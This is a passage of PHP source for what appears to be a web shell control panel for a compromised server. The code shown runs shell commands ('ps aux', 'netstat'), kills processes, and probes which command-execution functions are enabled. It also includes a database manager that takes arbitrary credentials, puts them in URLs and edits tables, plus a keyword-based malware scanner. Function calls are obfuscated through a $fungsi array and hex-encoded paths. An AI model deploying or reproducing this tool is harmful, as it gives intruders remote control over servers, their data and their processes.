                $info['mem_usage'] = $info['mem_total'] = 'N/A';
            }
            
            if (function_exists('disk_total_space') && function_exists('disk_free_space')) {
                $info['disk_total'] = disk_total_space('/');
                $info['disk_free'] = disk_free_space('/');
                $info['disk_used'] = $info['disk_total'] - $info['disk_free'];
            } else {
                $info['disk_total'] = $info['disk_free'] = $info['disk_used'] = 'N/A';
            }
            
            if (file_exists('/proc/uptime')) {
                $uptime = file_get_contents('/proc/uptime');
                $uptime = explode(' ', $uptime);
                $info['uptime'] = (int)$uptime[0];
            } else {
                $info['uptime'] = 'N/A';
            }
            
            return $info;
        }
        
        function getProcessList() {
            $processes = array();
                $output = cmd('ps aux');
                $lines = explode("\n", $output);
                array_shift($lines); 
                
                foreach ($lines as $line) {
                    if (empty($line)) continue;
                    $parts = preg_split('/\s+/', $line);
                    if (count($parts) < 11) continue;
                    
                    $process = array(
                        'user' => $parts[0],
                        'pid' => $parts[1],
                        'cpu' => $parts[2],
                        'mem' => $parts[3],
                        'command' => implode(' ', array_slice($parts, 10))
                    );
                    $processes[] = $process;
                }
            return $processes;
        }
        
        function getNetworkConnections() {
            $connections = array();
                $output = cmd('netstat -tulnp 2>/dev/null');
                $lines = explode("\n", $output);
                array_shift($lines); 
                array_shift($lines); 
                
                foreach ($lines as $line) {
                    if (empty($line)) continue;
                    $parts = preg_split('/\s+/', $line);
                    if (count($parts) < 6) continue;
                    
                    $connection = array(
                        'proto' => $parts[0],
                        'local' => $parts[3],
                        'remote' => isset($parts[4]) ? $parts[4] : '-',
                        'status' => isset($parts[5]) ? $parts[5] : '-',
                        'pid' => isset($parts[6]) ? explode('/', $parts[6])[0] : '-'
                    );
                    $connections[] = $connection;
                }
            return $connections;
        }
    
        
        $sysInfo = getSystemInfo();
        
        function formatMemory($bytes) {
            if ($bytes === 'N/A') return 'N/A';
            $units = ['B', 'KB', 'MB', 'GB', 'TB'];
            $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
            $pow = min($pow, count($units) - 1);
            $bytes /= pow(1024, $pow);
            return round($bytes, 2) . ' ' . $units[$pow];
        }
        
        $cpuLoadPercent = $sysInfo['cpu_load'] !== 'N/A' ? min(100, $sysInfo['cpu_load'] * 100) : 0;
        
        $memUsagePercent = $sysInfo['mem_usage'] !== 'N/A' && $sysInfo['mem_total'] !== 'N/A' ? 
            ($sysInfo['mem_usage'] / $sysInfo['mem_total']) * 100 : 0;
        
        $diskUsagePercent = $sysInfo['disk_total'] !== 'N/A' && $sysInfo['disk_used'] !== 'N/A' ? 
            ($sysInfo['disk_used'] / $sysInfo['disk_total']) * 100 : 0;
        
        function formatUptime($seconds) {
            if ($seconds === 'N/A') return 'N/A';
            $hours = floor($seconds / 3600);
            $minutes = floor(($seconds % 3600) / 60);
            return sprintf('%dh %dm', $hours, $minutes);
        }
        
        function getDisabledFunctions() {
            $disabled = ini_get('disable_functions');
            if (empty($disabled)) {
                return array();
            }
            return explode(',', $disabled);
        }

        $importantFunctions = array(
            'exec', 'system', 'shell_exec', 'passthru', 'proc_open',
            'popen', 'curl_exec', 'curl_multi_exec', 'parse_ini_file',
            'show_source', 'symlink', 'putenv', 'mail', 'dl',
            'chmod', 'chown', 'chgrp', 'link', 'fsockopen',
            'pfsockopen', 'posix_kill', 'posix_mkfifo', 'posix_setpgid',
            'posix_setsid', 'posix_setuid', 'pcntl_exec', 'imap_open',
            'apache_setenv', 'proc_nice', 'proc_terminate', 'proc_get_status',
            'escapeshellcmd', 'escapeshellarg', 'ini_restore', 'stream_socket_server'
        );

        $disabledFunctions = getDisabledFunctions();
        $disabledImportant = array_intersect($importantFunctions, $disabledFunctions);
        ?>
        
        <div class="main-content flex-1 overflow-auto">
            <div class="p-6">
                <?php if (isset($_GET['disabled_functions'])): ?>
                    <div class="glass-effect rounded-lg p-6 mb-6 cyber-border">
                        <div class="flex items-center justify-between mb-4">
                            <h2 class="text-xl font-bold cyber-font cyber-glow">
                                <i class="fas fa-ban text-red-400 mr-2"></i>
                                Disabled Functions Check
                            </h2>
                            <a href="?d=<?= hx($fungsi[0]()) ?>" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded text-sm flex items-center cyber-btn">
                                <i class="fas fa-arrow-left mr-1"></i> Back
                            </a>
                        </div>
                        
                        <div class="glass-effect rounded-lg p-4 mb-6 cyber-border">
                            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                                <div class="flex items-center">
                                    <i class="fas fa-microchip text-blue-400 mr-2 cyber-glow"></i>
                                    <div>
                                        <div class="text-xs text-gray-400 cyber-font">TOTAL CHECKED</div>
                                        <div class="text-sm"><?= count($importantFunctions) ?> functions</div>
                                    </div>
                                </div>
                                <div class="flex items-center">
                                    <i class="fas fa-ban text-red-400 mr-2 cyber-glow-danger"></i>
                                    <div>
                                        <div class="text-xs text-gray-400 cyber-font">DISABLED</div>
                                        <div class="text-sm"><?= count($disabledImportant) ?> functions</div>
                                    </div>
                                </div>
                                <div class="flex items-center">
                                    <i class="fas fa-check-circle text-green-400 mr-2 cyber-glow-success"></i>
                                    <div>
                                        <div class="text-xs text-gray-400 cyber-font">ENABLED</div>
                                        <div class="text-sm"><?= count($importantFunctions) - count($disabledImportant) ?> functions</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <div class="glass-effect rounded-lg p-4 cyber-border">
                            <h3 class="text-lg font-medium cyber-font mb-3 cyber-glow">
                                <i class="fas fa-list text-blue-400 mr-2"></i>
                                Critical Functions Status
                            </h3>
                            
                            <table class="disabled-functions-table">
                                <thead>
                                    <tr>
                                        <th>Function</th>
                                        <th>Status</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php foreach ($importantFunctions as $func): ?>
                                        <tr>
                                            <td class="font-mono"><?= $func ?></td>
                                            <td>
                                                <?php if (in_array($func, $disabledFunctions)): ?>
                                                    <span class="danger-badge cyber-font">DISABLED</span>
                                                <?php else: ?>
                                                    <span class="success-badge cyber-font">ENABLED</span>
                                                <?php endif; ?>
                                            </td>
                                        </tr>
                                    <?php endforeach; ?>
                                </tbody>
                            </table>
                        </div>
                    </div>
                <?php elseif (isset($_GET['process'])): ?>
                    <div class="glass-effect rounded-lg p-6 mb-6 cyber-border">
                        <div class="flex items-center justify-between mb-4">
                            <h2 class="text-xl font-bold cyber-font cyber-glow">
                                <i class="fas fa-microchip text-blue-400 mr-2"></i>
                                Process Manager
                            </h2>
                            <div>
                                <a href="?d=<?= hx($fungsi[0]()) ?>" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded text-sm flex items-center cyber-btn">
                                    <i class="fas fa-arrow-left mr-1"></i> Back
                                </a>
                            </div>
                        </div>
                        
                        <div class="glass-effect rounded-lg p-4 cyber-border">
                            <div class="mb-4">
                                <div class="flex items-center">
                                    <i class="fas fa-info-circle text-blue-400 mr-2"></i>
                                    <span class="text-sm">Showing all running processes. Click on a process to kill it.</span>
                                </div>
                            </div>
                            
                            <div class="overflow-x-auto">
                                <table class="process-table">
                                    <thead>
                                        <tr>
                                            <th>PID</th>
                                            <th>User</th>
                                            <th>CPU %</th>
                                            <th>MEM %</th>
                                            <th>Command</th>
                                            <th>Action</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php 
                                        $processes = getProcessList();
                                        foreach ($processes as $process): 
                                        ?>
                                            <tr>
                                                <td class="process-pid"><?= $process['pid'] ?></td>
                                                <td class="process-user"><?= $process['user'] ?></td>
                                                <td class="process-cpu"><?= $process['cpu'] ?></td>
                                                <td class="process-mem"><?= $process['mem'] ?></td>
                                                <td class="process-command" title="<?= htmlspecialchars($process['command']) ?>"><?= htmlspecialchars(substr($process['command'], 0, 50)) ?></td>
                                                <td>
                                                <form method="POST" style="display:inline;">
                                                    <input type="hidden" name="pid" value="<?= $process['pid'] ?>">
                                                    <button type="submit" class="kill-process-btn">
                                                        <i class="fas fa-skull"></i> Kill
                                                    </button>
                                                </form>
                                                </td>
                                            </tr>
                                        <?php endforeach; ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                <?php elseif (isset($_GET['network'])): ?>
                    <div class="glass-effect rounded-lg p-6 mb-6 cyber-border">
                        <div class="flex items-center justify-between mb-4">
                            <h2 class="text-xl font-bold cyber-font cyber-glow">
                                <i class="fas fa-network-wired text-green-400 mr-2"></i>
                                Network Connections
                            </h2>
                            <div>
                                <a href="?d=<?= hx($fungsi[0]()) ?>" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded text-sm flex items-center cyber-btn">
                                    <i class="fas fa-arrow-left mr-1"></i> Back
                                </a>
                            </div>
                        </div>
                        
                        <div class="glass-effect rounded-lg p-4 cyber-border">
                            <div class="mb-4">
                                <div class="flex items-center">
                                    <i class="fas fa-info-circle text-blue-400 mr-2"></i>
                                    <span class="text-sm">Showing all active network connections.</span>
                                </div>
                            </div>
                            
                            <div class="overflow-x-auto">
                                <table class="network-table">
                                    <thead>
                                        <tr>
                                            <th>Protocol</th>
                                            <th>Local Address</th>
                                            <th>Remote Address</th>
                                            <th>Status</th>
                                            <th>PID</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php 
                                        $connections = getNetworkConnections();
                                        foreach ($connections as $conn): 
                                        ?>
                                            <tr>
                                                <td><?= $conn['proto'] ?></td>
                                                <td class="network-local"><?= $conn['local'] ?></td>
                                                <td class="network-remote"><?= $conn['remote'] ?></td>
                                                <td class="network-status"><?= $conn['status'] ?></td>
                                                <td class="network-pid"><?= $conn['pid'] ?></td>
                                            </tr>
                                        <?php endforeach; ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                    <?php elseif (isset($_GET['dbmanager'])): ?>
                    <div class="glass-effect rounded-lg p-6 mb-6 cyber-border">
                        <div class="flex items-center justify-between mb-4">
                            <h2 class="text-xl font-bold cyber-font cyber-glow">
                                <i class="fas fa-database text-blue-400 mr-2"></i>
                                Database Manager
                            </h2>
                            <div>
                                <a href="?d=<?= hx($fungsi[0]()) ?>" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded text-sm flex items-center cyber-btn">
                                    <i class="fas fa-arrow-left mr-1"></i> Back
                                </a>
                            </div>
                        </div>
                        
                        <div class="glass-effect rounded-lg p-4 cyber-border">
                            <h3 class="text-lg font-medium cyber-font mb-3 cyber-glow">
                                <i class="fas fa-plug text-green-400 mr-2"></i>
                                Database Connection
                            </h3>
                            
                            <form action="" method="post">
                                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                                    <div>
                                        <label class="db-form-label">Host</label>
                                        <input type="text" name="db_host" class="db-form-input" placeholder="localhost" value="<?= isset($_POST['db_host']) ? htmlspecialchars($_POST['db_host']) : 'localhost' ?>">
                                    </div>
                                    <div>
                                        <label class="db-form-label">Port</label>
                                        <input type="text" name="db_port" class="db-form-input" placeholder="3306" value="<?= isset($_POST['db_port']) ? htmlspecialchars($_POST['db_port']) : '3306' ?>">
                                    </div>
                                </div>
                                
                                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                                    <div>
                                        <label class="db-form-label">Username</label>
                                        <input type="text" name="db_user" class="db-form-input" placeholder="Database username" value="<?= isset($_POST['db_user']) ? htmlspecialchars($_POST['db_user']) : '' ?>">
                                    </div>
                                    <div>
                                        <label class="db-form-label">Password</label>
                                        <input type="password" name="db_pass" class="db-form-input" placeholder="Database password" value="<?= isset($_POST['db_pass']) ? htmlspecialchars($_POST['db_pass']) : '' ?>">
                                    </div>
                                </div>
                                
                                <div class="mb-4">
                                    <label class="db-form-label">Database Name (optional)</label>
                                    <input type="text" name="db_name" class="db-form-input" placeholder="Leave empty to list all databases" value="<?= isset($_POST['db_name']) ? htmlspecialchars($_POST['db_name']) : '' ?>">
                                </div>
                                
                                <button type="submit" name="db_connect" class="db-connect-btn">
                                    <i class="fas fa-plug mr-2"></i> Connect
                                </button>
                            </form>
                            
                            <?php
                if (isset($_POST['db_connect']) || (isset($_GET['table']) && isset($_GET['db_host']))) {
                    $db_host = isset($_POST['db_host']) ? $_POST['db_host'] : $_GET['db_host'];
                    $db_port = isset($_POST['db_port']) ? $_POST['db_port'] : $_GET['db_port'];
                    $db_user = isset($_POST['db_user']) ? $_POST['db_user'] : $_GET['db_user'];
                    $db_pass = isset($_POST['db_pass']) ? $_POST['db_pass'] : $_GET['db_pass'];
                    $db_name = isset($_POST['db_name']) ? $_POST['db_name'] : $_GET['db_name'];
                    
                    try {
                        $dsn = "mysql:host=$db_host;port=$db_port";
                        if (!empty($db_name)) {
                            $dsn .= ";dbname=$db_name";
                        }
                        
                        $pdo = new PDO($dsn, $db_user, $db_pass);
                        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                        
                        echo '<div class="mt-6">';
                        echo '<h3 class="text-lg font-medium cyber-font mb-3 cyber-glow">';
                        echo '<i class="fas fa-database text-blue-400 mr-2"></i>';
                        echo 'Database Information';
                        echo '</h3>';
                        
                        if (empty($db_name)) {
                            $stmt = $pdo->query("SHOW DATABASES");
                            $databases = $stmt->fetchAll(PDO::FETCH_COLUMN);
                            
                            echo '<div class="db-tables-list">';
                            echo '<h4 class="text-md font-medium cyber-font mb-2 cyber-glow">Available Databases</h4>';
                            foreach ($databases as $database) {
                                echo '<div class="db-table-item">';
                                echo '<a href="?d=' . hx($fungsi[0]()) . '&dbmanager&db_host=' . urlencode($db_host) . '&db_port=' . urlencode($db_port) . '&db_user=' . urlencode($db_user) . '&db_pass=' . urlencode($db_pass) . '&db_name=' . urlencode($database) . '">';
                                echo '<i class="fas fa-database text-blue-400 mr-2"></i>' . htmlspecialchars($database);
                                echo '</a>';
                                echo '</div>';
                            }
                            echo '</div>';
                        } else {
                            $stmt = $pdo->query("SHOW TABLES");
                            $tables = $stmt->fetchAll(PDO::FETCH_COLUMN);
                            
                            echo '<div class="db-tables-list">';
                            echo '<h4 class="text-md font-medium cyber-font mb-2 cyber-glow">Tables in ' . htmlspecialchars($db_name) . '</h4>';
                            foreach ($tables as $table) {
                                echo '<div class="db-table-item">';
                                echo '<a href="?d=' . hx($fungsi[0]()) . '&dbmanager&db_host=' . urlencode($db_host) . '&db_port=' . urlencode($db_port) . '&db_user=' . urlencode($db_user) . '&db_pass=' . urlencode($db_pass) . '&db_name=' . urlencode($db_name) . '&table=' . urlencode($table) . '">';
                                echo '<i class="fas fa-table text-blue-400 mr-2"></i>' . htmlspecialchars($table);
                                echo '</a>';
                                echo '</div>';
                            }
                            echo '</div>';
                            
                            if (isset($_GET['table'])) {
                                $table = $_GET['table'];
                                
                                if (isset($_POST['delete_record'])) {
                                    $id_column = $_POST['id_column'];
                                    $id_value = $_POST['id_value'];
                                    
                                    $stmt = $pdo->prepare("DELETE FROM `$table` WHERE `$id_column` = ?");
                                    $stmt->execute([$id_value]);
                                    
                                    echo '<div class="bg-green-600 text-white p-3 rounded mb-4">Record deleted successfully.</div>';
                                }
                                
                                if (isset($_POST['add_record'])) {
                                    $columns = [];
                                    $values = [];
                                    $placeholders = [];
                                    
                                    foreach ($_POST as $key => $value) {
                                        if (strpos($key, 'new_') === 0) {
                                            $column = substr($key, 4);
                                            $columns[] = "`$column`";
                                            $values[] = $value;
                                            $placeholders[] = '?';
                                        }
                                    }
                                    
                                    $sql = "INSERT INTO `$table` (" . implode(', ', $columns) . ") VALUES (" . implode(', ', $placeholders) . ")";
                                    $stmt = $pdo->prepare($sql);
                                    $stmt->execute($values);
                                    
                                    echo '<div class="bg-green-600 text-white p-3 rounded mb-4">Record added successfully.</div>';
                                }
                                
                                if (isset($_POST['update_record'])) {
                                    $id_column = $_POST['id_column'];
                                    $id_value = $_POST['id_value'];
                                    
                                    $setParts = [];
                                    $values = [];
                                    
                                    foreach ($_POST as $key => $value) {
                                        if (strpos($key, 'edit_') === 0) {
                                            $column = substr($key, 5);
                                            $setParts[] = "`$column` = ?";
                                            $values[] = $value;
                                        }
                                    }
                                    
                                    $values[] = $id_value;
                                    
                                    $sql = "UPDATE `$table` SET " . implode(', ', $setParts) . " WHERE `$id_column` = ?";
                                    $stmt = $pdo->prepare($sql);
                                    $stmt->execute($values);
                                    
                                    echo '<div class="bg-green-600 text-white p-3 rounded mb-4">Record updated successfully.</div>';
                                }
                                ?>
                                <div id="editModal" class="modal hidden">
                                    <div class="max-h-[60vh] cyber-border overflow-y-auto">
                                        <div class="flex justify-between items-center mb-4">
                                            <h3 class="text-lg font-bold cyber-font cyber-glow">Edit Record</h3>
                                            <button onclick="hideModal('editModal')" class="text-gray-400 hover:text-white">
                                                <i class="fas fa-times"></i>
                                            </button>
                                        </div>
                                        <form id="editForm" method="post">
                                            <input type="hidden" name="id_column" id="editIdColumn">
                                            <input type="hidden" name="id_value" id="editIdValue">
                                            <div id="editFields" class="space-y-4"></div>
                                            <div class="mt-6 flex justify-end space-x-3">
                                                <button type="button" onclick="hideModal('editModal')" class="bg-gray-600 hover:bg-gray-700 text-white px-4 py-2 rounded">
                                                    Cancel
                                                </button>
                                                <button type="submit" name="update_record" class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded">
                                                    <i class="fas fa-save mr-2"></i> Save Changes
                                                </button>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                                
                                <div id="deleteModal" class="modal hidden">
                                    <div class="modal-content cyber-border">
                                        <div class="flex justify-between items-center mb-4">
                                            <h3 class="text-lg font-bold cyber-font cyber-glow">Delete Record</h3>
                                            <button onclick="hideModal('deleteModal')" class="text-gray-400 hover:text-white">
                                                <i class="fas fa-times"></i>
                                            </button>
                                        </div>
                                        <form id="deleteForm" method="post">
                                            <input type="hidden" name="id_column" id="deleteIdColumn">
                                            <input type="hidden" name="id_value" id="deleteIdValue">
                                            <p class="mb-4">Are you sure you want to delete this record? This action cannot be undone.</p>
                                            <div class="flex justify-end space-x-3">
                                                <button type="button" onclick="hideModal('deleteModal')" class="bg-gray-600 hover:bg-gray-700 text-white px-4 py-2 rounded">
                                                    Cancel
                                                </button>
                                                <button type="submit" name="delete_record" class="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded">
                                                    <i class="fas fa-trash mr-2"></i> Delete
                                                </button>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                                
                                <div id="addModal" class="modal hidden">
                                    <div class="max-h-[60vh] cyber-border overflow-y-auto  modal-content cyber-border">
                                        <div class="flex justify-between items-center mb-4">
                                            <h3 class="text-lg font-bold cyber-font cyber-glow">Add New Record</h3>
                                            <button onclick="hideModal('addModal')" class="text-gray-400 hover:text-white">
                                                <i class="fas fa-times"></i>
                                            </button>
                                        </div>
                                        <form id="addForm" method="post">
                                            <div id="addFields" class="space-y-4"></div>
                                            <div class="mt-6 flex justify-end space-x-3">
                                                <button type="button" onclick="hideModal('addModal')" class="bg-gray-600 hover:bg-gray-700 text-white px-4 py-2 rounded">
                                                    Cancel
                                                </button>
                                                <button type="submit" name="add_record" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded">
                                                    <i class="fas fa-plus mr-2"></i> Add Record
                                                </button>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                                <?php
                                $stmt = $pdo->query("DESCRIBE `$table`");
                                $columns_info = $stmt->fetchAll(PDO::FETCH_ASSOC);
                                $primary_key = '';
                                
                                foreach ($columns_info as $col) {
                                    if ($col['Key'] == 'PRI') {
                                        $primary_key = $col['Field'];
                                        break;
                                    }
                                }
                                
                                $stmt = $pdo->query("SELECT * FROM `$table` LIMIT 100");
                                $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
                                
                                echo '<div class="mt-6">';
                                echo '<div class="flex justify-between items-center mb-4">';
                                echo '<h4 class="text-md font-medium cyber-font cyber-glow">Data in ' . htmlspecialchars($table) . '</h4>';
                                
                                echo '<button onclick="showAddModal()" class="flex items-center">';
                                echo '<i class="fas fa-plus mr-1"></i> Add Record';
                                echo '</button>';
                                echo '</div>';
                                
                                if (count($rows) > 0) {
                                    echo '<div class="max-h-[60vh] cyber-border glass-effect overflow-y-auto">';
                                    echo '<table class="database-table">';
                                    echo '<thead>';
                                    echo '<tr>';
                                    foreach (array_keys($rows[0]) as $column) {
                                        echo '<th>' . htmlspecialchars($column) . '</th>';
                                    }
                                    echo '<th>Actions</th>';
                                    echo '</tr>';
                                    echo '</thead>';
                                    echo '<tbody>';
                                    foreach ($rows as $row) {
                                        echo '<tr>';
                                        foreach ($row as $value) {
                                            echo '<td>' . htmlspecialchars($value) . '</td>';
                                        }
                                        echo '<td class="flex space-x-1">';
                                        echo '<button onclick="showEditModal(' . htmlspecialchars(json_encode($row), ENT_QUOTES, 'UTF-8') . ', \'' . htmlspecialchars($primary_key) . '\', \'' . htmlspecialchars($table) . '\')">';
                                        echo '<i class="fas fa-edit mr-2"></i> Edit';
                                        echo '</button>';
                                        echo '<button onclick="showDeleteModal(\'' . htmlspecialchars($primary_key) . '\', \'' . htmlspecialchars($row[$primary_key]) . '\', \'' . htmlspecialchars($table) . '\')">';
                                        echo '<i class="fas fa-trash mr-2"></i> Delete';
                                        echo '</button>';
                                        echo '</td>';
                                        echo '</tr>';
                                    }
                                    echo '</tbody>';
                                    echo '</table>';
                                    echo '</div>';
                                } else {
                                    echo '<div class="text-gray-400">No data found in this table.</div>';
                                }
                                echo '</div>';
                            }
                        }
                        
                        echo '</div>';
                    } catch (PDOException $e) {
                        echo '<div class="mt-4 text-red-400">';
                        echo '<i class="fas fa-exclamation-triangle mr-2"></i>';
                        echo 'Connection failed: ' . htmlspecialchars($e->getMessage());
                        echo '</div>';
                    }
                }
                ?>
            </div>
        </div>
        
        
        <script>
            function showModal(modalId) {
                document.getElementById(modalId).classList.remove('hidden');
            }
            
            function hideModal(modalId) {
                document.getElementById(modalId).classList.add('hidden');
            }
            
            function showEditModal(rowData, primaryKey, tableName) {
                document.getElementById('editIdColumn').value = primaryKey;
                document.getElementById('editIdValue').value = rowData[primaryKey];
                
                const fieldsContainer = document.getElementById('editFields');
                fieldsContainer.innerHTML = '';
                
                for (const [key, value] of Object.entries(rowData)) {
                    if (key !== primaryKey) {
                        fieldsContainer.innerHTML += `
                            <div>
                                <label class="db-form-label">${key}</label>
                                <input type="text" name="edit_${key}" class="db-form-input" value="${value}">
                            </div>
                        `;
                    }
                }
                
                document.getElementById('editForm').action = window.location.href;
                showModal('editModal');
            }
            
            function showDeleteModal(primaryKey, idValue, tableName) {
                document.getElementById('deleteIdColumn').value = primaryKey;
                document.getElementById('deleteIdValue').value = idValue;
                
                document.getElementById('deleteForm').action = window.location.href;
                showModal('deleteModal');
            }
            
            function showAddModal() {
                const fieldsContainer = document.getElementById('addFields');
                fieldsContainer.innerHTML = '';
                
                const headers = document.querySelectorAll('.database-table th:not(:last-child)');
                
                headers.forEach(header => {
                    const columnName = header.textContent.trim();
                    fieldsContainer.innerHTML += `
                        <div>
                            <label class="db-form-label">${columnName}</label>
                            <input type="text" name="new_${columnName}" class="db-form-input" placeholder="Enter ${columnName}">
                        </div>
                    `;
                });
                
                document.getElementById('addForm').action = window.location.href;
                showModal('addModal');
            }
        </script>
                <?php elseif (isset($_GET['malwarescan'])): ?>
                    <div class="glass-effect rounded-lg p-6 mb-6">
                        <div class="flex items-center justify-between mb-4">
                            <h2 class="text-xl font-bold">
                                <i class="fas fa-shield-alt text-red-400 mr-2"></i>
                                Malware Scanner
                            </h2>
                            <a href="?d=<?= hx($fungsi[0]()) ?>" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded text-sm flex items-center">
                                <i class="fas fa-arrow-left mr-1"></i> Back
                            </a>
                        </div>
                        
                        <div class="glass-effect rounded-lg p-4 mb-6">
                            <h3 class="text-lg font-medium mb-3">
                                <i class="fas fa-search text-blue-400 mr-2"></i>
                                Scan Directory
                            </h3>
                            
                            <form action="" method="post" class="mb-6">
                                <div class="mb-4">
                                    <label class="block text-sm font-medium mb-1">Directory to Scan</label>
                                    <input type="text" name="scan_dir" class="w-full bg-slate-700 text-white rounded px-3 py-2" 
                                           value="<?= isset($_POST['scan_dir']) ? htmlspecialchars($_POST['scan_dir']) : $fungsi[0]() ?>">
                                </div>
                                
                                <div class="mb-4">
                                    <label class="block text-sm font-medium mb-1">Scan Type</label>
                                    <select name="scan_type" class="w-full bg-slate-700 text-white rounded px-3 py-2">
                                        <option value="quick">Quick Scan</option>
                                        <option value="deep">Deep Scan</option>
                                    </select>
                                </div>
                                
                                <button type="submit" name="start_scan" class="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded">
                                    <i class="fas fa-play mr-2"></i> Start Scan
                                </button>
                            </form>
                            
                            <?php
                            if (isset($_POST['start_scan'])) {
                                $scan_dir = $_POST['scan_dir'];
                                $scan_type = $_POST['scan_type'];
                                
                                $malware_signatures = array(
                                    // Code Execution
                                    'eval(',
                                    'system(',
                                    'exec(',
                                    'shell_exec(',
                                    'passthru(',
                                    'popen(',
                                    'proc_open(',
                                    'nepo_corp',
                                    'curl',
                                
                                    // Obfuscation / Encoding
                                    'gzinflate(',
                                    'gzuncompress(',
                                    'base64_decode(',
                                    'hex2bin(',
                                    'str_rot13(',
                                    'chr(',
                                    'strrev(',
                                    'rawurldecode(',
                                    'unlink(',
                                    'rename(',
                                    'copy(',
                                    'move_uploaded_file(',
                                    'fopen(',
                                    'lruc',
                                );
                                
                                
                                function scan_directory($dir, $signatures, $deep = false) {
                                    $results = array();
                                    $files = scandir($dir);
                                    $chunk_size = 50; // Process files in chunks
                                    
                                    foreach (array_chunk($files, $chunk_size) as $chunk) {
                                        foreach ($chunk as $file) {
                                            if ($file == '.' || $file == '..') continue;
                                            
                                            $path = $dir . '/' . $file;
                                            
                                            if (is_dir($path) && $deep) {
                                                $sub_results = scan_directory($path, $signatures, $deep);
                                                $results = array_merge($results, $sub_results);
                                            } elseif (is_file($path)) {
                                                $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
                                                if (in_array($ext, array('php', 'phtml'))) {
                                                    $content = file_get_contents($path);
                                                    foreach ($signatures as $sig) {
                                                        if (strpos($content, $sig) !== false) {
                                                            $results[] = array(
                                                                'file' => $path,
                                                                'signature' => $sig,
                                                                'line' => find_line_number($content, $sig)
                                                            );
                                                            break;
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    
                                    return $results;
                                }
                                
                                function find_line_number($content, $search) {
                                    $lines = explode("\n", $content);
                                    foreach ($lines as $i => $line) {
                                        if (strpos($line, $search) !== false) {
                                            return $i + 1;
                                        }
                                    }
                                    return 'N/A';
                                }
                                
                                $deep_scan = ($scan_type == 'deep');
                                $scan_results = scan_directory($scan_dir, $malware_signatures, $deep_scan);
                                
                                echo '<div class="glass-effect rounded-lg p-4">';
                                echo '<h3 class="text-lg font-medium mb-3">';
                                echo '<i class="fas fa-list text-blue-400 mr-2"></i>';
                                echo 'Scan Results';
                                echo '</h3>';
                                
                                if (count($scan_results) > 0) {
                                    ?>
                                    <div class="max-h-[60vh] cyber-border glass-effect overflow-y-auto">
                                        <table class="w-full text-sm text-left text-white bg-slate-800 border border-slate-700">
                                            <thead class="bg-slate-700 text-slate-200 uppercase text-xs">
                                                <tr>
                                                    <th class="px-4 py-3 w-2/5"><i class="fas fa-file-code mr-1"></i>File</th>
                                                    <th class="px-4 py-3 w-1/4"><i class="fas fa-bug mr-1 text-red-400"></i>Malware Type</th>
                                                    <th class="px-4 py-3 w-1/6"><i class="fas fa-align-left mr-1"></i>Line</th>
                                                    <th class="px-4 py-3 w-1/6 text-center"><i class="fas fa-tools mr-1"></i>Action</th>
                                                </tr>
                                            </thead>
                                            <tbody class="text-slate-300">
                                                <?php foreach ($scan_results as $r): ?>
                                                    <tr class="border-b border-slate-700 hover:bg-slate-700/50">
                                                        <td class="px-4 py-3 break-all">
                                                            <span class="block font-medium text-white"><?= htmlspecialchars(basename($r['file'])) ?></span>
                                                            <small class="text-slate-400"><?= htmlspecialchars(dirname($r['file'])) ?></small>
                                                        </td>
                                                        <td class="px-4 py-3 text-red-400">
                                                            <code><?= htmlspecialchars($r['signature']) ?></code>
                                                        </td>
                                                        <td class="px-4 py-3"><?= $r['line'] ?></td>
                                                        <td class="px-4 py-3 text-center">
                                                            <a href="?d=<?= hx(dirname($r['file'])) ?>&f=<?= hx(basename($r['file'])) ?>" class="inline-block text-blue-400 hover:text-blue-300 mx-1" title="Edit File">
                                                                <i class="fas fa-edit"></i>
                                                            </a>
                                                            <a href="?action=delete&item=<?= hx($r['file']) ?>" class="inline-block text-red-400 hover:text-red-300 mx-1" title="Delete File">
                                                                <i class="fas fa-trash-alt"></i>
                                                            </a>
                                                        </td>
                                                    </tr>
                                                <?php endforeach; ?>
                                            </tbody>
                                        </table>
                                    </div>
                                    <div class="mt-4 bg-red-900/50 p-3 rounded">
                                        <i class="fas fa-exclamation-triangle text-red-400 mr-2"></i>
                                        <span class="font-medium">Found <?= count($scan_results) ?> potential malware files!</span>
                                    </div>
                                    <?php
                                } else {
                                    echo '<div class="bg-green-900/50 p-3 rounded">';
                                    echo '<i class="fas fa-check-circle text-green-400 mr-2"></i>No malware signatures found in scanned files.';
                                    echo '</div>';
                                }
                                echo '</div>';
                            }
                            ?>
                        </div>
                    </div>
                    <?php else: ?>
                    <!-- System Stats Grid -->
                    <div class="stats-grid">
                        <!-- CPU Card -->
                        <div class="info-card rounded-lg p-4 cyber-panel">
                            <div class="flex items-center justify-between mb-2">
                                <div class="flex items-center">
                                    <i class="fas fa-microchip text-blue-400 mr-2 cyber-glow"></i>
                                    <span class="font-medium cyber-font">CPU LOAD</span>
                                </div>
                                <span class="text-blue-400 cyber-font"><?= $sysInfo['cpu_load'] !== 'N/A' ? round($sysInfo['cpu_load'], 2) : 'N/A' ?></span>
                            </div>
                            <div class="progress-container mb-2">
